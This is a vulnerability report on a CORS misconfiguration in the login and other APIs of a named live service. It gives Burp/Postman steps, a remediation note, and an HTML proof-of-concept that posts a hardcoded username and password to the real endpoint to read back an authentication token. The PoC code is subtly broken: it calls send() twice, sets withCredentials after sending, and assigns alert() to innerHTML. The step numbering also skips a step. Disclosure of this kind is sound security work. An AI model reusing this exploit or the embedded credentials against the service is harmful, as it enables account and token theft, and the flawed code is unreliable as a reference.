# Cross Origin Resource Sharing

### **Vulnerable API:**

All

### **Severity:**

Medium

### **Description:**

While testing all the responses by the help POSTMAN and BURP SUITE, Access-Control-Allow-Origin was set to ‘origin’, hence this allowed an arbitrary user to intercept the request and add an extra ‘Origin’ header with a value of any random website like ‘[https://bing.com](https://bing.com)’. This can allow an attacker to steal sensitive information which is being parsed by JSON on the page.\


### **Steps:**

1.Open postman and set its proxy to burp suite. Load the API and forward the request. Make sure Burp Interceptor is ON.

2.Once you click on ‘SEND’ in POSTMAN you will be prompted in BURP for the request in the interceptor.

3.Move this request to Repeater and add an extra header in the request like. **Origin: https://iamvulnerable.com**

****

![Check For CORS](https://lh5.googleusercontent.com/\_kzMZ5lV1vT4VrbD\_ejMqOBYAWq8saCupcHVczU0h6OY-qYpWinu5d8V12JdiK4MPyZ8h6DoiQG\_XMDPFsSPfWkH5n83xFftrU986s7RT9UIT8dXuL7MQhn1\_dNKIjPzrpDHChd5)

4\. As you can see that the response is reflecting our “ORIGIN” header, hence to exploit this follow the below HTML doc.\


```markup
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
<div id="demo">
<button type="button" onclick="cors()">Exploit POST Based JSON CORS</button>
</div>
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = alert(this.responseText);
    }
  };
  xhttp.open("POST", "https://signzy.tech/api/v2/patrons/login", true);
  xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xhttp.send(JSON.stringify({"username": "signzystaging","password" :"bhai"}));
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
</body>
</html>
```

\


6\. Saving and Running the file will result in running the script which leaks authToken to next API.\


![AuthToken and PatronID Leak Using CORS](https://lh4.googleusercontent.com/CUX1RFciPycPlv9HLmoFmwS050xRjpxuFcNM-F28ySfuorWx3qwv-pN46IZORTqcs5kxtalwXsJWD83wiejMvad0PymHECJ4g471sWocQY8r0bzWe\_N97Y5mEig9WGbTxyay3K9l)

7\. As you can see that this information leak was on Authentication API, but this particular vulnerability is actually possible in all the API request , resulting in leak of sensitive information like Authentication  Token.

### Impact:

Sensitive information leak due to CORS can be exploited.

### Solution:

Use of `Access-Control-Allow-Origin` should  be used only for the white listed domains, also we can define a function to cross check the referer header and the origin header.\
